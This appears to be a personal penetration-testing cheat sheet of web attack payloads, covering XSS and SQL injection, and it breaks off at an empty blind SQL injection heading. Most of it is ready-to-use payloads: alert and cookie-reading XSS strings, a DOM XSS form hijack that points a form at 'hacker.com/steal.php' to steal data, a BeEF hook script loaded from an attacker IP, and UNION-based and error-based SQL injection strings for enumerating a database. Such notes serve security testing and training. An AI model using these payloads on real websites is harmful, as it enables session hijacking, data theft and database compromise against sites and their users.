### Web Application Security
_1.1 Cross-Site Scripting (XSS)_  
```
Reflected/Stored XSS
<H1>Test</H1> //Simple test for sanitization of input
<script>alert('XSS');</script> //Typical XSS test input field script
<script>alert(document.cookie)</script> //Display current session cookie in alert

DOM XSS - Runs on Client-side / Victim browser
//If input in the URL value gets reflected in the form input field, DOM
Example: site.com/donate.php#amount="><img src="aaa" onerror="alert(document.domain)">
"><svg/onload="alert(document.domain)">

//In Web Console
document.forms[1].action="test.html" //Sends the form action "senddonation.php" or selected action to non-existent test.html page, if this works, can add same payload to svg tag and send cookies to attacker site.
Example: site.com/donate.php#amount="><svg/onload="document.forms[1].action='//hacker.com/steal.php'">

BEEF XSS
//edit the beef config file at
/etc/beef-xss/config.yml
Permitted UI Subnet: Allow only local machine
Permitted Hooking Subnet: Allow hooking only from in-scope subnet
Let BEEF listen on port 80 or 443
<script> src="http://AttackerIP:80/hook.js"></script>
```

_1.2 SQL Injection (SQLi)_
```
Finding SQLi
Test parameter with an always true and always false condition.
id=2' and 'a'a='a //always true statement
id=2' and 'a'='b //always false 
and 'a'='a'
') or 1=1; -- //space minus minus space

In-band SQL Injections
clientinfo.php?id=200 //changing id parameter pulls up different client profile
' UNION SELECT null,null,null; -- - //continue adding nulls until true statement is reached, 
test whether null variables are strings or integers, Ex. change nulls to, 'els1', 2222, 'els3'
//To display output in browser select nonexistent id parameter value
//Can change null variable values to return valuable information about database
id=9999' UNION SELECT @@version, 2222, 'els3'; -- - 
http://pentestmonkey.net/category/cheat-sheet

Error-based SQL Injections
//When testing for SQLi returns a SQL error, can use SQL errors to return useful information
id=1 or @@version=1);--

Blind SQL Injection

```
